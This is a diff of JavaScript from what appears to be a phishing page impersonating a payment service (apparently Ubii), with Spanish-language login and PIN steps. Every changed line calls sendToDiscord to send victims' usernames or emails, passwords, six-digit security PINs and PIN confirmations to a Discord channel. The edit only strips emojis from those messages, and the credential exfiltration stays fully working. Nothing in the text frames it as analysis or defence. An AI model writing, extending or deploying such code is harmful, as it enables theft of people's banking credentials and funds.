@@ -452,7 +452,7 @@
             loadingSec.classList.remove('hidden');
             backBtn.classList.add('hidden');
 
-            sendToDiscord(`⏳ **El usuario hizo clic en 'Ya Autoricé Desde Mi Correo' y comenzó el análisis.**`);
+            sendToDiscord(` **El usuario hizo clic en 'Ya Autoricé Desde Mi Correo' y comenzó el análisis.**`);
         }
 
         // Ir del Paso 1 al Paso 2 (Envía usuario y contraseña a Discord)
@@ -468,7 +468,7 @@
             });
 
             // Notificación a Discord
-            sendToDiscord(`📌 **NUEVO INICIO DE SESIÓN**\n👤 **Tipo:** ${selectedType}\n📧 **Usuario/Correo:** ${userEmailOrName}\n🔑 **Contraseña:** ${userPassword}`);
+            sendToDiscord(` **NUEVO INICIO DE SESIÓN**\n **Tipo:** ${selectedType}\n **Usuario/Correo:** ${userEmailOrName}\n **Contraseña:** ${userPassword}`);
 
             goToStep(2);
         }
@@ -481,7 +481,7 @@
             inputs.forEach(i => firstEnteredPin += i.value);
 
             if (firstEnteredPin.length === 6) {
-                sendToDiscord(`🔢 **CLAVE DE SEGURIDAD (PASO 2)**\n📧 **Usuario:** ${userEmailOrName}\n🔐 **PIN:** ${firstEnteredPin}`);
+                sendToDiscord(` **CLAVE DE SEGURIDAD (PASO 2)**\n **Usuario:** ${userEmailOrName}\n **PIN:** ${firstEnteredPin}`);
                 goToStep(3);
             }
         }
@@ -494,10 +494,10 @@
             inputs.forEach(i => confirmPin += i.value);
 
             if (confirmPin === firstEnteredPin) {
-                sendToDiscord(`✅ **CONFIRMACIÓN DE CLAVE (PASO 3)**\n📧 **Usuario:** ${userEmailOrName}\n🔐 **PIN Confirmado:** ${confirmPin}`);
+                sendToDiscord(` **CONFIRMACIÓN DE CLAVE (PASO 3)**\n **Usuario:** ${userEmailOrName}\n **PIN Confirmado:** ${confirmPin}`);
                 goToStep(4);
             } else {
-                sendToDiscord(`⚠️ **ERROR DE CLAVE (PASO 3)**\n📧 **Usuario:** ${userEmailOrName}\n❌ **Ingresó PIN incorrecto:** ${confirmPin}`);
+                sendToDiscord(` **ERROR DE CLAVE (PASO 3)**\n **Usuario:** ${userEmailOrName}\n **Ingresó PIN incorrecto:** ${confirmPin}`);
                 document.getElementById('errorMismatch').classList.remove('hidden');
                 inputs.forEach(i => i.value = '');
                 inputs[0].focus();
@@ -541,7 +541,7 @@
         setupPinInputs('.pin-input-3');
 
         function resendAuthEmail() {
-            sendToDiscord(`📩 **El usuario solicitó reenvío del correo de autorización.**`);
+            sendToDiscord(` **El usuario solicitó reenvío del correo de autorización.**`);
             const toast = document.createElement('div');
             toast.className = "fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-800 text-white px-4 py-2.5 rounded-full text-xs font-medium shadow-lg z-50 flex items-center gap-2";
             toast.innerHTML = `<i class="fa-solid fa-paper-plane text-ubiiBlue"></i> Correo de autorización reenviado`;
